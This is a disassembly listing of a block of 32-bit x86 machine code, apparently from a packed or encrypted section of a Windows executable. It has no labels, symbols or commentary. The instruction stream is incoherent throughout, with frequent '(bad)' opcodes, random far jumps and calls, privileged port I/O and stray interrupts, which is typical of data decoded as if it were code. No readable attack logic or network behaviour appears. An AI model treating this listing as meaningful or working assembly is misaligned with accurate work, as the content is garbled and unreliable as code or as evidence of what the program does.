  415bcf:	xchg   ebx,eax
  415bd0:	pop    ds
  415bd1:	dec    esp
  415bd2:	imul   ebx,edx,0x51f30c22
  415bd8:	push   edi
  415bd9:	test   eax,0xb706752d
  415bde:	pop    es
  415bdf:	fwait
  415be0:	js     0x415bdd
  415be2:	mov    ah,0xa5
  415be4:	jne    0x415c43
  415be6:	mov    edi,0x23722c67
  415beb:	ss leave 
  415bed:	imul   al
  415bef:	cwde   
  415bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bf1:	pushf  
  415bf2:	mov    esi,0x26e7e16d
  415bf7:	mov    dl,0xe8
  415bf9:	or     BYTE PTR ds:0x1672b859,0xff
  415c00:	sub    dl,BYTE PTR [esi+0x20092637]
  415c06:	(bad)  
  415c07:	shr    BYTE PTR [eax+0x24],cl
  415c0a:	nop
  415c0b:	cld    
  415c0c:	and    BYTE PTR [edi+0x13],bh
  415c0f:	fsub   st,st(1)
  415c11:	in     eax,0xbc
  415c13:	out    0x9b,al
  415c15:	push   ss
  415c16:	xchg   DWORD PTR [eax],esp
  415c18:	cmc    
  415c19:	sahf   
  415c1a:	(bad)  
  415c1b:	jmp    0x415c0a
  415c1d:	pop    ebx
  415c1e:	les    ebp,FWORD PTR [edi+0x7]
  415c21:	dec    ebx
  415c22:	xchg   edx,eax
  415c23:	push   ebp
  415c24:	out    0x5f,eax
  415c26:	push   edx
  415c27:	into   
  415c28:	sub    esp,DWORD PTR [edx-0x32da50e0]
  415c2e:	adc    al,0x25
  415c30:	mov    al,0xbd
  415c32:	or     eax,0x50f598d1
  415c37:	add    ebp,DWORD PTR ds:0x729f77d8
  415c3d:	cmp    esi,DWORD PTR [ecx-0x79]
  415c40:	and    DWORD PTR [ecx-0x644a1bc1],0xffffff91
  415c47:	test   eax,esi
  415c49:	lods   eax,DWORD PTR ds:[esi]
  415c4a:	std    
  415c4b:	cdq    
  415c4c:	xor    ebp,DWORD PTR [ecx]
  415c4e:	push   eax
  415c4f:	loopne 0x415c9e
  415c51:	sub    eax,0x2058a394
  415c56:	ins    BYTE PTR es:[edi],dx
  415c57:	sub    eax,0x61a8b739
  415c5c:	pop    esi
  415c5d:	cli    
  415c5e:	cdq    
  415c5f:	repz mov ah,0xc5
  415c62:	neg    DWORD PTR [ebx+0x3bb58415]
  415c68:	and    DWORD PTR [edi-0xb1b1aba],0xffffffba
  415c6f:	bound  edx,QWORD PTR [esi+0x5c2756f2]
  415c75:	stc    
  415c76:	es add eax,0x20f04db7
  415c7c:	scas   al,BYTE PTR es:[edi]
  415c7d:	sub    DWORD PTR [esi-0x1bea6e7e],ebp
  415c83:	mov    al,BYTE PTR [edx-0xcf69bf4]
  415c89:	mov    ch,0x9b
  415c8b:	sub    eax,0xd0f0a149
  415c90:	xor    al,BYTE PTR [eax+0x3f]
  415c93:	jno    0x415cfb
  415c95:	loope  0x415c98
  415c97:	pop    ecx
  415c98:	push   edi
  415c99:	xchg   edi,eax
  415c9a:	xchg   ebp,eax
  415c9b:	or     BYTE PTR [ebx+0x24],ah
  415c9e:	mov    dl,BYTE PTR [edx-0x5f7a5340]
  415ca4:	sub    ebp,esi
  415ca6:	ficom  DWORD PTR [esi-0x4e]
  415ca9:	and    al,0xcc
  415cab:	cwde   
  415cac:	inc    eax
  415cad:	(bad)  
  415cae:	loope  0x415cf8
  415cb0:	leave  
  415cb1:	lea    esp,ds:0x1f51f6e8
  415cb7:	sub    edi,esi
  415cb9:	cdq    
  415cba:	inc    edi
  415cbb:	clc    
  415cbc:	stos   DWORD PTR es:[edi],eax
  415cbd:	and    eax,0x307eef8b
  415cc2:	or     dl,al
  415cc4:	jne    0x415d44
  415cc6:	jp     0x415cb0
  415cc8:	int    0xea
  415cca:	adc    DWORD PTR [eax+0x1c1b9de9],ebx
  415cd0:	push   0x6f
  415cd2:	inc    esi
  415cd3:	xor    al,0x5
  415cd5:	ins    DWORD PTR es:[edi],dx
  415cd6:	jp     0x415cd7
  415cd8:	test   DWORD PTR [eax+edi*1],esi
  415cdb:	scas   eax,DWORD PTR es:[edi]
  415cdc:	mov    edx,DWORD PTR [esi]
  415cde:	lods   eax,DWORD PTR ds:[esi]
  415cdf:	and    al,0x74
  415ce1:	fstp   DWORD PTR ds:0x53a0227
  415ce7:	fild   WORD PTR [edx]
  415ce9:	inc    esi
  415cea:	out    dx,eax
  415ceb:	xchg   edx,eax
  415cec:	pop    ss
  415ced:	in     eax,dx
  415cee:	jo     0x415cee
  415cf0:	scas   al,BYTE PTR es:[edi]
  415cf1:	xor    eax,0x5c9c2306
  415cf6:	lea    esp,[edx+0x3c]
  415cf9:	clc    
  415cfa:	std    
  415cfb:	in     al,0x3c
  415cfd:	es xchg edx,eax
  415cff:	inc    ax
  415d01:	shl    BYTE PTR [edx+0x5b6414b],1
  415d07:	icebp  
  415d08:	sub    al,0xc7
  415d0a:	neg    ch
  415d0c:	imul   eax,esp,0xffffffa3
  415d0f:	(bad)  
  415d11:	call   ecx
  415d13:	test   eax,0xb8bc9cd9
  415d18:	data16 into 
  415d1a:	in     eax,0x7b
  415d1c:	or     DWORD PTR ds:0xe0997f28,eax
  415d22:	push   es
  415d23:	in     al,dx
  415d24:	lock adc edx,DWORD PTR [esp+eax*8-0x7e83b7cb]
  415d2c:	iret   
  415d2d:	jl     0x415ce7
  415d2f:	dec    ecx
  415d30:	add    al,0x74
  415d32:	sbb    cl,BYTE PTR es:[eax-0x31]
  415d36:	dec    ebx
  415d37:	adc    ebp,DWORD PTR [edi]
  415d39:	jge    0x415cc4
  415d3b:	inc    edx
  415d3c:	icebp  
  415d3d:	ret    0xcb0c
  415d40:	cmp    eax,0x21458a5
  415d45:	or     BYTE PTR [ebx],ch
  415d47:	cli    
  415d48:	fidivr WORD PTR [eax-0x59d98e58]
  415d4e:	and    eax,0xeecb13da
  415d53:	sahf   
  415d54:	jg     0x415d86
  415d56:	mov    dl,0xc4
  415d58:	pop    ecx
  415d59:	jp     0x415d82
  415d5b:	mov    ebp,0x39e31100
  415d60:	stos   BYTE PTR es:[edi],al
  415d61:	rcr    DWORD PTR [esi],cl
  415d63:	das    
  415d64:	or     eax,0x21166af6
  415d69:	aas    
  415d6a:	sti    
  415d6b:	retf   
  415d6c:	add    ebx,edi
  415d6e:	adc    edx,DWORD PTR [ebp+ebx*8-0x734cbfbd]
  415d75:	adc    cl,bh
  415d77:	aaa    
  415d78:	mov    eax,ds:0x99e9f602
  415d7d:	sbb    DWORD PTR [ecx-0x16],edi
  415d80:	cmp    al,0xb5
  415d82:	jnp    0x415d7a
  415d84:	or     al,0xc8
  415d86:	or     dh,al
  415d88:	ins    DWORD PTR es:[edi],dx
  415d89:	lods   al,BYTE PTR ds:[esi]
  415d8a:	xchg   BYTE PTR ds:0x98734447,ah
  415d90:	add    eax,0x6b054177
  415d95:	sbb    ah,dl
  415d97:	ficom  DWORD PTR ds:0x7911d971
  415d9d:	fisttp WORD PTR [ecx-0x7b4489c1]
  415da3:	xor    BYTE PTR [ebx-0x2c],bl
  415da6:	stos   BYTE PTR es:[edi],al
  415da7:	cli    
  415da8:	aam    0x4a
  415daa:	sbb    eax,0xcd80ad66
  415daf:	add    BYTE PTR [ecx],dl
  415db1:	loop   0x415deb
  415db3:	mov    dl,0x6a
  415db5:	mov    esp,0x24b10b7b
  415dba:	pop    esp
  415dbb:	shl    bh,cl
  415dbd:	pushf  
  415dbe:	push   es
  415dbf:	adc    al,ah
  415dc1:	das    
  415dc2:	std    
  415dc3:	push   esp
  415dc4:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  415dc6:	daa    
  415dc7:	and    eax,0x57911c2e
  415dcc:	mov    edx,0xf4b60aa7
  415dd1:	dec    ebx
  415dd2:	je     0x415dd6
  415dd4:	fidiv  WORD PTR [eax+0x4c]
  415dd7:	push   cs
  415dd8:	jmp    0xfee1:0x13bc48ee
  415ddf:	cs mov dh,0xa8
  415de2:	cmc    
  415de3:	pop    ebx
  415de4:	xor    ebp,DWORD PTR [esi-0x6e]
  415de7:	xor    BYTE PTR [ebx],bh
  415de9:	mov    dl,0x2b
  415deb:	fdivr  QWORD PTR [eax-0x74a4ac56]
  415df1:	data16 ins BYTE PTR es:[edi],dx
  415df3:	call   0x900dee3c
  415df8:	ja     0x415d93
  415dfa:	cs scas al,BYTE PTR es:[edi]
  415dfc:	add    eax,0x532bbdcc
  415e01:	push   eax
  415e02:	sahf   
  415e03:	in     eax,0xec
  415e05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e06:	std    
  415e07:	xchg   ebp,eax
  415e08:	push   0x515ed2a4
  415e0d:	in     al,0x3e
  415e0f:	pop    edi
  415e10:	sbb    eax,0xc7132f52
  415e15:	inc    esi
  415e16:	cmp    esp,DWORD PTR [eax]
  415e18:	in     eax,0x68
  415e1a:	out    0x5c,eax
  415e1c:	inc    ecx
  415e1d:	(bad)  
  415e1e:	hlt    
  415e1f:	push   ebx
  415e20:	mov    edx,0xae42a6ad
  415e25:	inc    BYTE PTR [esi]
  415e27:	daa    
  415e28:	and    al,0xed
  415e2a:	xchg   esp,eax
  415e2b:	push   ebx
  415e2c:	jecxz  0x415e6a
  415e2e:	cmp    DWORD PTR [edx-0x39cdb3f8],ebx
  415e34:	mov    al,ds:0x426277ca
  415e39:	mov    BYTE PTR [eax-0x6bd2c5a5],ah
  415e3f:	not    ecx
  415e41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e42:	xor    BYTE PTR [edi+0x47],dh
  415e45:	je     0x415e83
  415e47:	inc    ecx
  415e48:	seto   BYTE PTR [edi+0x2d]
  415e4c:	iret   
  415e4d:	(bad)  
  415e4e:	data16 shl bh,cl
  415e51:	mov    edx,0xaabd949d
  415e56:	js     0x415de3
  415e58:	not    ebp
  415e5a:	cli    
  415e5b:	aam    0x3c
  415e5d:	ror    DWORD PTR [eax],0x49
  415e60:	fisub  DWORD PTR [esi]
  415e62:	sti    
  415e63:	jbe    0x415ec8
  415e65:	mov    al,ds:0xd30e707e
  415e6a:	add    al,ah
  415e6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e6d:	adc    cl,BYTE PTR [ecx]
  415e6f:	and    al,BYTE PTR [edi-0x14]
  415e72:	mov    al,ds:0x88dae0f4
  415e77:	arpl   WORD PTR [esi-0x6fc0e45c],sp
  415e7d:	and    ah,ch
  415e7f:	arpl   si,sp
  415e81:	sub    al,0x12
  415e83:	cmp    ebx,DWORD PTR [ebx+0xf52b639]
  415e89:	add    al,0xc9
  415e8b:	mov    dl,0x11
  415e8d:	mov    cl,0x4b
  415e8f:	sbb    al,0xc1
  415e91:	xchg   DWORD PTR [ecx-0x54],ebp
  415e94:	jle    0x415e42
  415e96:	daa    
  415e97:	jns    0x415e72
  415e99:	sbb    al,0xd1
  415e9b:	jecxz  0x415e67
  415e9d:	or     eax,DWORD PTR [eax+0x399d48f5]
  415ea3:	int    0xdf
  415ea5:	mov    bl,0x92
  415ea7:	and    eax,0x6f97c0d1
  415eac:	mov    al,ds:0x40779238
  415eb1:	jge    0x415ec9
  415eb3:	in     al,dx
  415eb4:	ds jns 0x415e8d
  415eb7:	push   ebx
  415eb8:	xchg   ebp,eax
  415eb9:	mov    ch,0x3c
  415ebb:	leave  
  415ebc:	xor    cl,dh
  415ebe:	in     eax,dx
  415ebf:	mov    ebx,DWORD PTR [edi]
  415ec1:	push   edi
  415ec2:	(bad)  
  415ec4:	sar    BYTE PTR [ebp-0x3c86540e],0x33
  415ecb:	mov    ds:0x8e82797f,eax
  415ed0:	push   cs
  415ed1:	repz inc edi
  415ed3:	or     eax,0x68d402a
  415ed8:	xchg   esi,eax
  415ed9:	iret   
  415eda:	call   DWORD PTR [edi+esi*4+0x23]
  415ede:	mov    ebx,DWORD PTR [eax+0x6941399f]
  415ee4:	les    esp,FWORD PTR [ebx]
  415ee6:	loopne 0x415ed2
  415ee8:	mov    edi,0x26a35444
  415eed:	and    eax,0x82e71a28
  415ef2:	sub    BYTE PTR [esi+0x0],dh
  415ef5:	xchg   edi,eax
  415ef6:	in     al,0xe0
  415ef8:	push   ebx
  415ef9:	push   ebx
  415efa:	mov    edx,0xa766953e
  415eff:	inc    ebx
  415f00:	pop    es
  415f01:	mov    gs,WORD PTR [edi-0x11837879]
  415f07:	stc    
  415f08:	ror    BYTE PTR [esi+0x2c0f4e7b],cl
  415f0e:	push   edi
  415f0f:	imul   esp,DWORD PTR [edi-0xd],0xd1a06f64
  415f16:	add    DWORD PTR [edx+0x5c],edx
  415f19:	sbb    eax,0xee0244b7
  415f1e:	gs push ebp
  415f20:	dec    esi
  415f21:	data16 mov cl,0x36
  415f24:	sub    ch,BYTE PTR [edi-0x43]
  415f27:	cmc    
  415f28:	and    eax,0xc80a6e38
  415f2d:	xor    BYTE PTR [edx+0x71],al
  415f30:	add    eax,0xf707c096
  415f35:	mov    esi,0x777c3f62
  415f3a:	push   es
  415f3b:	mov    ss,WORD PTR [ebp-0x25f2a34c]
  415f41:	push   cs
  415f42:	mov    al,0x79
  415f44:	jne    0x415f82
  415f46:	push   edi
  415f47:	mov    dh,0xbe
  415f49:	xor    ebp,esi
  415f4b:	xor    ecx,ecx
  415f4d:	fisubr WORD PTR [esi]
  415f4f:	test   eax,0xca471b7c
  415f54:	sbb    eax,0x681a7ebc
  415f59:	inc    esp
  415f5a:	mov    ecx,0x6e98c58b
  415f5f:	inc    ecx
  415f60:	ins    DWORD PTR es:[edi],dx
  415f61:	retf   0x4768
  415f64:	add    BYTE PTR [esp+ebp*1+0x129f2d6c],ah
  415f6b:	hlt    
  415f6c:	in     al,dx
  415f6d:	sbb    eax,0x8e1179d8
  415f72:	imul   edi,DWORD PTR [ebx],0xba22fb9f
  415f78:	call   esp
  415f7a:	add    ch,BYTE PTR [ebx+edi*8+0x24]
  415f7e:	lahf   
  415f7f:	xchg   ecx,eax
  415f80:	pop    ss
  415f81:	cmc    
  415f82:	cmp    al,0xeb
  415f84:	adc    edi,ebp
  415f86:	inc    ebp
  415f87:	xchg   esp,eax
  415f88:	jg     0x415f40
  415f8a:	stos   DWORD PTR es:[edi],eax
  415f8b:	das    
  415f8c:	aam    0x93
  415f8e:	in     eax,0x78
  415f90:	das    
  415f91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f92:	add    eax,0x2441551d
  415f97:	mov    ch,0x45
  415f99:	xor    DWORD PTR [edi+eax*4-0x7b],eax
  415f9d:	fnstsw WORD PTR [eax+edi*4]
  415fa0:	test   DWORD PTR [ebx],0x925b3f1c
  415fa6:	jnp    0x416002
  415fa8:	sub    BYTE PTR [eax+0x28],0xda
  415fac:	jmp    0xef57be5a
  415fb1:	(bad)  
  415fb2:	sbb    ah,cl
  415fb4:	xchg   esp,eax
  415fb5:	popa   
  415fb6:	mov    al,0xd6
  415fb8:	lock dec ecx
  415fba:	bound  ebx,QWORD PTR [eax-0x71]
  415fbd:	shr    DWORD PTR [ebp-0x1],1
  415fc0:	push   esi
  415fc1:	pop    edi
  415fc2:	call   0x3ff7:0xf312ceda
  415fc9:	pop    ebx
  415fca:	fs push ecx
  415fcc:	cmc    
  415fcd:	and    ebp,edi
  415fcf:	pop    esi
  415fd0:	aad    0xa5
  415fd2:	aam    0xec
  415fd4:	mov    dl,0x71
  415fd6:	shr    ecx,0xd6
  415fd9:	or     eax,0xdbb898f0
  415fde:	add    BYTE PTR ds:0x2fae61a0,ah
  415fe4:	xor    cl,BYTE PTR [edi-0x1862e542]
  415fea:	jmp    0xfbf224ef
  415fef:	jo     0x415fcc
  415ff1:	pop    esi
  415ff2:	cmp    eax,0x3c508c03
  415ff7:	hlt    
  415ff8:	out    dx,al
  415ff9:	nop
  415ffa:	imul   ebx,ebx,0x1fb7c4a2
  416000:	jle    0x415fe2
  416002:	mov    dh,0x79
  416004:	sbb    cl,BYTE PTR [ebp-0x41a38655]
  41600a:	and    eax,0xc63fef0e
  41600f:	inc    edi
  416010:	push   0xc807a5ef
  416015:	mov    eax,ds:0xed8743af
  41601a:	lds    ecx,FWORD PTR ds:0x2bd86ee8
  416020:	(bad)  
  416021:	inc    esp
  416022:	or     ecx,DWORD PTR [eax+edx*2]
  416025:	into   
  416026:	les    ebp,FWORD PTR [edx]
  416028:	jle    0x415fec
  41602a:	out    dx,eax
  41602b:	leave  
  41602c:	jle    0x415fe0
  41602e:	fcomp  DWORD PTR fs:[edi-0x30]
  416032:	inc    edi
  416033:	iret   
  416034:	enter  0x6ce7,0x3a
  416038:	retf   0x5ca0
  41603b:	pop    esi
  41603c:	dec    ebp
  41603d:	xchg   ecx,eax
  41603e:	arpl   WORD PTR ds:0x3d452e97,sp
  416044:	out    0x3e,al
  416046:	hlt    
  416047:	stc    
  416048:	data16 or BYTE PTR [ebx+0x66],al
  41604c:	mov    DWORD PTR [ecx-0x33d7729d],edi
  416052:	inc    ebx
  416053:	sub    al,0xa9
  416055:	invd   
  416057:	sbb    dl,ah
  416059:	mov    ecx,0x69e781c6
  41605e:	enter  0xd13e,0x3e
  416062:	inc    edi
  416063:	or     al,0xd6
  416065:	in     eax,dx
  416066:	stos   DWORD PTR es:[edi],eax
  416067:	loop   0x416016
  416069:	test   BYTE PTR [ecx+0x56],dh
  41606c:	in     eax,0x8b
  41606e:	dec    ecx
  41606f:	and    dl,0x3a
  416072:	ja     0x4160d2
  416074:	(bad)  
  416075:	aad    0xdc
  416077:	push   eax
  416078:	test   edi,ebp
  41607a:	mov    ch,0x58
  41607c:	sub    DWORD PTR [bx],ecx
  41607f:	mov    WORD PTR [ebp+0x773bcdf3],cs
  416085:	inc    eax
  416086:	mov    esp,0x948bf072
  41608b:	sbb    edi,DWORD PTR [edx]
  41608d:	sub    al,0xf6
  41608f:	pop    ebp
  416090:	retf   
  416091:	mov    cl,0xb8
  416093:	xchg   BYTE PTR [ebp-0x180234db],bl
  416099:	aam    0xb
  41609b:	(bad)  
  41609c:	int    0xf9
  41609e:	jmp    0x38a09d62
  4160a3:	popf   
  4160a4:	adc    al,0x79
  4160a6:	sti    
  4160a7:	xchg   edx,eax
  4160a8:	pop    ebp
  4160a9:	add    BYTE PTR [ebx-0x3927fe79],cl
  4160af:	outs   dx,BYTE PTR ds:[esi]
  4160b0:	push   esp
  4160b1:	jbe    0x4160e0
  4160b3:	pop    ds
  4160b4:	ficom  WORD PTR [esi]
  4160b6:	adc    DWORD PTR [edi+ecx*1+0x6310910f],0x56dcf429
  4160c1:	xor    eax,eax
  4160c3:	cmp    ebx,DWORD PTR [ebp-0x5]
  4160c6:	or     eax,0x9d7a9f20
  4160cb:	push   ss
  4160cc:	add    eax,0xa37dfe8a
  4160d1:	fld    st(7)
  4160d3:	in     eax,dx
  4160d4:	xchg   ah,cl
  4160d6:	xor    edx,DWORD PTR es:[ebp-0x4d6bbd31]
  4160dd:	fucomip st,st(6)
  4160df:	out    dx,al
  4160e0:	pop    edi
  4160e1:	mov    ebx,0x64eddffa
  4160e6:	or     ecx,edx
  4160e8:	iret   
  4160e9:	bound  edx,QWORD PTR [edi]
  4160eb:	retf   0xfa10
  4160ee:	(bad)  
  4160ef:	sahf   
  4160f0:	dec    edx
  4160f1:	lea    esi,[esi+0x4c]
  4160f4:	pop    ds
  4160f5:	xor    ah,cl
  4160f7:	add    al,0xa
  4160f9:	mov    edx,0x7d55fc0d
  4160fe:	xor    al,0x39
  416100:	daa    
  416101:	mov    eax,0xe2bb4e38
  416106:	cdq    
  416107:	mov    eax,0x74307231
  41610c:	mov    ds:0xafa1443e,eax
  416111:	in     eax,0xf3
  416113:	dec    edx
  416114:	je     0x416096
  416116:	mov    ah,0x4a
  416118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416119:	push   ebx
  41611a:	cmp    al,0x5d
  41611c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41611d:	adc    bh,BYTE PTR [ebp+0x76]
  416120:	cli    
  416121:	mov    esp,0xb84b38eb
  416126:	or     BYTE PTR [edx+edx*8+0x572197d0],cl
  41612d:	xchg   edx,eax
  41612e:	sbb    DWORD PTR [edi],edi
  416130:	imul   ebp
  416132:	call   0x960b:0x43db0767
  416139:	sub    BYTE PTR [ecx+0x7a],al
  41613c:	jb     0x4160de
  41613e:	xchg   esi,eax
  41613f:	sbb    al,0xe6
  416141:	ret    
  416142:	push   cs
  416143:	xor    al,0x86
  416145:	cld    
  416146:	push   edx
  416147:	inc    edi
  416148:	xlat   BYTE PTR ds:[ebx]
  416149:	cmp    eax,0xf5c48ef2
  41614e:	mov    ch,0x8c
  416150:	sbb    BYTE PTR [edi+0x2079d803],bh
  416156:	xchg   ebp,eax
  416157:	push   ds
  416158:	and    BYTE PTR [esi],bl
  41615a:	loope  0x416134
  41615c:	or     BYTE PTR [eax+0x543003d6],al
  416162:	std    
  416163:	sti    
  416164:	jae    0x4161b6
  416166:	jmp    0x4161d6
  416168:	(bad)  
  416169:	sub    ch,al
  41616b:	xchg   ebp,eax
  41616c:	add    DWORD PTR [edi-0x1a],ecx
  41616f:	clc    
  416170:	imul   esp,DWORD PTR [eax-0x6607ed9e],0x976dc45f
  41617a:	jns    0x416100
  41617c:	adc    al,0x51
  41617e:	push   eax
  41617f:	adc    cl,cl
  416181:	push   esi
  416182:	pop    ebp
  416183:	push   es
  416184:	outs   dx,BYTE PTR ds:[esi]
  416185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416186:	(bad)  
  416187:	repnz inc BYTE PTR [ecx]
  41618a:	(bad)  
  41618b:	push   esp
  41618c:	bound  ebx,QWORD PTR [esi]
  41618e:	mov    edx,0x3e1a767b
  416193:	pop    ds
  416194:	int    0xc
  416196:	push   0xf9ab0f22
  41619b:	lds    ebx,FWORD PTR [edi+0x5bca4ee1]
  4161a1:	arpl   WORD PTR [edi],sp
  4161a3:	xchg   esi,eax
  4161a4:	out    dx,al
  4161a5:	xchg   eax,esp
  4161a7:	scas   al,BYTE PTR es:[edi]
  4161a8:	add    al,0x7c
  4161aa:	mov    dh,0xb6
  4161ac:	js     0x41614b
  4161ae:	pop    esp
  4161af:	imul   edx,edi,0xffffffe2
  4161b2:	mul    BYTE PTR [eax]
  4161b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161b5:	jo     0x4161d6
  4161b7:	cs aas 
  4161b9:	push   esi
  4161ba:	out    dx,al
  4161bb:	aam    0xde
  4161bd:	punpckhdq mm7,QWORD PTR [eax]
  4161c0:	sub    eax,0xaa642346
  4161c5:	jb     0x41616e
  4161c7:	and    bl,BYTE PTR [edx]
  4161c9:	inc    edx
  4161ca:	push   ecx
  4161cb:	mov    bl,0xb
  4161cd:	jmp    0x983e:0x17b5c2d1
  4161d4:	stos   BYTE PTR es:[edi],al
  4161d5:	adc    al,0xd1
  4161d7:	xchg   DWORD PTR [edx+0x51005116],esi
  4161dd:	mov    ch,0x87
  4161df:	pop    edi
  4161e0:	inc    edx
  4161e1:	sbb    dl,al
  4161e3:	data16 lahf 
  4161e5:	rol    DWORD PTR [edi],0x55
  4161e8:	jge    0x416254
  4161ea:	jmp    0xd2e6:0x957991e5
  4161f1:	jg     0x416259
  4161f3:	fild   QWORD PTR [ebx]
  4161f5:	mov    DWORD PTR [edx+0x66b3e442],esp
  4161fb:	mov    edx,0x8a30ef7d
  416200:	sar    BYTE PTR [ebp-0x10],1
  416203:	int    0x19
  416205:	dec    ecx
  416206:	cmp    edi,ecx
  416208:	fisub  WORD PTR [edx]
  41620a:	aas    
  41620b:	addr16 sub al,0x91
  41620e:	scas   eax,DWORD PTR es:[edi]
  41620f:	xchg   edx,eax
  416210:	rcr    DWORD PTR [ebp-0x52],0x57
  416214:	(bad)  
  416216:	or     DWORD PTR [edi+0x320e7514],ebx
  41621c:	adc    eax,0xbc2283c
  416221:	xchg   cl,ch
  416223:	mov    al,0xa5
  416225:	shr    edi,cl
  416227:	xchg   ebp,eax
  416228:	rcl    DWORD PTR [esi],cl
  41622a:	lea    ebp,[eax+esi*2]
  41622d:	mov    dl,BYTE PTR es:[edi-0x30]
  416231:	rcl    dh,0xa6
  416234:	aas    
  416235:	mov    al,0x15
  416237:	sbb    BYTE PTR [esi+0x6a],bl
  41623a:	(bad)  
  41623b:	jnp    0x41625f
  41623d:	add    al,0x6b
  41623f:	add    al,BYTE PTR [edx]
  416241:	rcr    DWORD PTR [edx+0xd14e35f],0x88
  416248:	mov    eax,ds:0x5c5d96e7
  41624d:	adc    al,0xfe
  41624f:	stos   BYTE PTR es:[edi],al
  416250:	pextrw esp,(bad),0xc5
  416252:	pusha  
  416253:	pop    esi
  416254:	ins    BYTE PTR es:[edi],dx
  416255:	sub    DWORD PTR [edx+0x41fc4a6e],edi
  41625b:	or     eax,0x35a595a4
  416260:	int    0x99
  416262:	mov    dh,0x2c
  416264:	mov    esi,0x7dcddcdc
  416269:	push   ds
  41626a:	dec    ebx
  41626b:	stos   BYTE PTR es:[edi],al
  41626c:	inc    ecx
  41626d:	loope  0x41620d
  41626f:	jmp    0x1838:0xf5533b24
  416276:	mov    al,0x4a
  416278:	popf   
  416279:	push   ss
  41627a:	(bad)  
  41627c:	mov    edi,0x5e199eae
  416281:	std    
  416282:	xchg   edx,eax
  416283:	retf   0xd312
  416286:	inc    ebp
  416287:	lods   al,BYTE PTR ds:[esi]
  416288:	xchg   esi,eax
  416289:	or     DWORD PTR [ebx],ecx
  41628b:	(bad)  
  41628d:	das    
  41628e:	test   edx,ebp
  416290:	pop    edi
  416291:	cld    
  416292:	scas   eax,DWORD PTR es:[edi]
  416293:	add    al,BYTE PTR [si+0x7a]
  416297:	lea    ecx,ds:[ebp+ebp*1-0x62]
  41629c:	add    ebp,DWORD PTR [esi-0x4b]
  41629f:	mov    ds,WORD PTR [edi+0x5ea5fefe]
  4162a5:	in     eax,0x67
  4162a7:	test   eax,0x5a26be77
  4162ac:	sbb    al,0x45
  4162ae:	psadbw mm6,QWORD PTR [ebp-0x69dfb3ee]
  4162b5:	std    
  4162b6:	ins    DWORD PTR es:[edi],dx
  4162b7:	mov    dl,0x7c
  4162b9:	pop    es
  4162ba:	cmp    BYTE PTR [ebx],bl
  4162bc:	repnz pop esi
  4162be:	dec    esp
  4162bf:	inc    ebp
  4162c0:	pop    ecx
  4162c1:	test   eax,0xd04d778a
  4162c6:	pusha  
  4162c7:	fmul   QWORD PTR [ebx]
  4162c9:	fistp  WORD PTR [ebp-0x73]
  4162cc:	mov    edx,0xab9dc372
  4162d1:	push   es
  4162d2:	out    dx,eax
  4162d3:	cmp    ebp,ecx
  4162d5:	jbe    0x4162fc
  4162d7:	add    esp,DWORD PTR [ecx+0x2d809405]
  4162dd:	mov    eax,ds:0x5df60f89
  4162e2:	mov    al,ds:0xaf1afc20
  4162e7:	inc    esi
  4162e8:	push   0xffffffe1
  4162ea:	push   es
  4162eb:	cmp    edi,edx
  4162ed:	rcr    BYTE PTR [eax],cl
  4162ef:	into   
  4162f0:	out    0xe1,al
  4162f2:	imul   edi,edi,0xdcdc7b91
  4162f8:	into   
  4162f9:	cmp    BYTE PTR [edi],0x91
  4162fc:	mov    ah,0xe3
  4162fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162ff:	setnp  BYTE PTR [edx]
  416302:	jne    0x4162c3
  416304:	retf   0x8cc
  416307:	popf   
  416308:	fiadd  WORD PTR [ecx-0x5b]
  41630b:	(bad)  
  41630c:	popf   
  41630d:	mov    ebx,0xc60f4242
  416312:	mov    DWORD PTR [ecx],eax
  416314:	or     eax,0xdb5e3b0b
  416319:	push   ebp
  41631a:	loop   0x416319
  41631c:	lea    esi,[ecx]
  41631e:	jne    0x416351
  416320:	arpl   WORD PTR [esi],cx
  416322:	dec    edi
  416323:	cmp    eax,ebx
  416325:	sahf   
  416326:	xchg   ecx,eax
  416327:	mov    bl,0x44
  416329:	hlt    
  41632a:	mov    eax,ds:0x84be59c7
  41632f:	(bad)  
  416330:	sbb    esi,DWORD PTR [ebx+eiz*2-0x7f72a80b]
  416337:	xor    DWORD PTR [ecx-0x6ed1b946],edx
  41633d:	push   esi
  41633e:	push   ecx
  41633f:	push   0xb84d2763
  416344:	sbb    al,0x9a
  416346:	stos   BYTE PTR es:[edi],al
  416347:	clc    
  416348:	lock rcr DWORD PTR [ebx],0x32
  41634c:	frstor [eax+0x6d]
  41634f:	scas   al,BYTE PTR es:[edi]
  416350:	jmp    0x5c6d8648
  416355:	sbb    DWORD PTR [edi],ecx
  416357:	jmp    0x197ee976
  41635c:	cmp    eax,0x78ce62a9
  416361:	ret    0x33cb
  416364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416365:	(bad)  
  416367:	in     al,dx
  416368:	push   ds
  416369:	ja     0x41638a
  41636b:	inc    eax
  41636c:	addr16 and al,bl
  41636f:	add    esi,DWORD PTR [eax+0x9]
  416372:	or     DWORD PTR [eax-0x489da9f0],esi
  416378:	outs   dx,BYTE PTR ds:[esi]
  416379:	shl    DWORD PTR [ebx+eax*8+0xa],cl
  41637d:	fist   WORD PTR [esi]
  41637f:	mov    dl,0x35
  416381:	in     eax,0xc4
  416383:	xlat   BYTE PTR ds:[ebx]
  416384:	push   ds
  416385:	mov    fs:0x55971e37,eax
  41638b:	cmc    
  41638c:	aaa    
  41638d:	in     eax,0x2b
  41638f:	pop    es
  416390:	push   ecx
  416391:	pop    ds
  416392:	pop    ebx
  416393:	(bad)  
  416394:	xor    eax,0x6adaa84a
  416399:	xor    al,0x27
  41639b:	aad    0xec
  41639d:	rol    esi,1
  41639f:	xchg   edx,eax
  4163a0:	and    eax,0xa37ecff1
  4163a5:	fadd   DWORD PTR [edx]
  4163a7:	cld    
  4163a8:	(bad)  
  4163aa:	das    
